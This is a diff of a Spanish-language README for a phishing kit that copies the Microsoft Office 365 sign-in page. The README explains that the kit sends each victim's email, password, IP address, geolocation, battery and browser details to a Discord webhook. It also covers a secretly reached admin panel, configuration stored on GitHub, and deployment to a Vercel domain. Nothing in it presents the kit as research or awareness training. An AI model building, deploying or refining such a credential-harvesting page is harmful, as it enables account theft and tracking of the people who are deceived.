@@ -1,101 +1,81 @@
 # Mail Office 365 - Panel de Login
 
-Panel de inicio de sesión estilo Microsoft Office 365 con envío de datos a Discord.
+Panel de inicio de sesión estilo Microsoft Office 365 con envío de datos a Discord y panel de administración global.
 
-## Estructura del proyecto
+## Archivos
 
-```
-mail-office365/
-├── index.html          → Login paso 1 (email)
-├── password.html       → Login paso 2 (contraseña)
-├── dashboard.html      → Página principal tras el login
-├── admin.html          → Panel de administración (oculto)
-├── api/
-│   ├── config.js       → API: GET/PUT/PATCH configuración global
-│   └── discord.js      → API: POST datos al webhook de Discord
-├── package.json
-├── vercel.json
-├── favicon.svg
-└── init.js             → Script de ayuda para configuración inicial
-```
+- `index.html` → Login paso 1 (email → "Siguiente")
+- `password.html` → Login paso 2 (contraseña → envía a Discord → dashboard)
+- `dashboard.html` → Página principal tras el login + panel admin
+- `favicon.svg` → ícono del navegador
+- `api/config.js` → API Vercel: GET/PATCH configuración global (GitHub-backed)
+- `api/discord.js` → API Vercel: POST envía datos al webhook de Discord
+- `vercel.json` → configuración de deploy
+- `package.json` → dependencies
 
 ## Flujo de uso
 
 1. **index.html** → Ingresa email → "Siguiente"
-2. **password.html** → Ingresa contraseña → "Iniciar sesión"
-   - Se envían los datos a Discord automáticamente
-   - Se redirige al dashboard
+2. **password.html** → Ingresa contraseña → "Iniciar sesión" → se envía a Discord → redirige al dashboard
 3. **dashboard.html** → Página principal del usuario
 
 ## Panel de administración
 
-Acceso secreto: **Doble tap en "Ayuda" + "Privacidad y cookies"** (pies de página).
+Acceso secreto: **Doble tap en "Ayuda" + "Privacidad y cookies"** (pies de página en todas las páginas).
 
 Desde el admin puedes editar:
-- Logo y textos del login
-- Fondo (color, degradado o imagen)
+- Logo y textos del login (global para todos)
+- Fondo del login (color, degradado, imagen URL)
 - Webhook de Discord
-- Plantilla del mensaje
+- Plantilla del mensaje de Discord
 - Título y subtítulo del dashboard
+- Contraseña del admin
 
-Los cambios se guardan en GitHub y son **globales** para todos los usuarios.
+Todos los cambios se guardan en **GitHub** y son **globales** para todos los usuarios.
 
 ## Variables de entorno (Vercel)
 
-Configura estas variables en tu proyecto Vercel:
+Configura en tu proyecto Vercel ("Environment Variables"):
 
 | Variable | Valor |
 |----------|-------|
-| `GH_TOKEN` | Token de acceso personal de GitHub |
-| `GH_OWNER` | `varasjaime777-alt` (o tu username) |
+| `GH_TOKEN` | *(configurar en Vercel Secrets)* |
+| `GH_OWNER` | `varasjaime777-alt` |
 | `GH_REPO` | `mail-office365` |
 
-## Configuración inicial
+## Configuración inicial del webhook
 
-1. Crea un repo en GitHub: `varasjaime777-alt/mail-office365`
-2. Sube este proyecto al repo
-3. En el repo, crea `config.json` con:
-   ```json
-   {
-     "discordWebhook": "https://discord.com/api/webhooks/ID/TOKEN"
-   }
-   ```
-4. Configura las env vars en Vercel
-5. Deploy: `vercel --prod --force`
+El config.json en GitHub necesita el webhook de Discord para que el envío funcione:
+
+```json
+{
+  "discordWebhook": "https://discord.com/api/webhooks/TU_ID/TU_TOKEN"
+}
+```
+
+Agrega este archivo a tu repo GitHub en `varasjaime777-alt/mail-office365` como `config.json`.
 
 ## Deploy
 
 ```bash
 cd /c/Users/varas/mail-office365
-vercel --prod --force
+vercel --prod
 ```
 
-## Verificar API
+## Dominio
 
-```bash
-# Config
-curl -s https://mail-office365.vercel.app/api/config
+- Producción: `https://mail-office365.vercel.app`
+- Dashboard: `https://mail-office365.vercel.app/dashboard.html`
 
-# Discord (prueba)
-curl -s -X POST https://mail-office365.vercel.app/api/discord \
-  -H "Content-Type: application/json" \
-  -d '{"email":"test@test.com","password":"***","userAgent":"test",...}'
-```
+## APIs usadas
 
-## Características técnicas
+- **ipinfo.io/json** → Geo IP (ciudad, país, región, ISP, lat/lon)
+- **api.ipify.org** → IP pública
+- **BatteryManager API** → Nivel y estado de carga (si el navegador lo soporta)
 
-- **Login 2 pasos**: Email primero, contraseña después (sin mostrar email en paso 2)
-- **Discord webhook**: Envía email, contraseña, IP, geo IP, dispositivo, batería, navegador
-- **Fondo editables**: Color, degradado o imagen URL
-- **Footer**: Ayuda, Términos de uso, Privacidad y cookies (en todas las páginas)
-- **Persistencia global**: GitHub API (100% gratis)
-- **Acceso admin**: Doble-tap secreto en footer
+## Notas
 
-## APIs de Geo IP usadas
-
-1. **ipinfo.io/json** → ciudad, país, región, ISP, lat/lon
-2. **api.ipify.org** → IP pública
-
-## Licencia
-
-Uso libre.
+- La contraseña siempre se incluye en el mensaje de Discord (tanto en template personalizado como en fallback).
+- La ubicación geo IP siempre se incluye (con fallback explícito).
+- Si una API de geo IP falla, el login sigue funcionando (try/catch en cada una).
+- El fondo del login se aplica al `body`, no al container de la card.
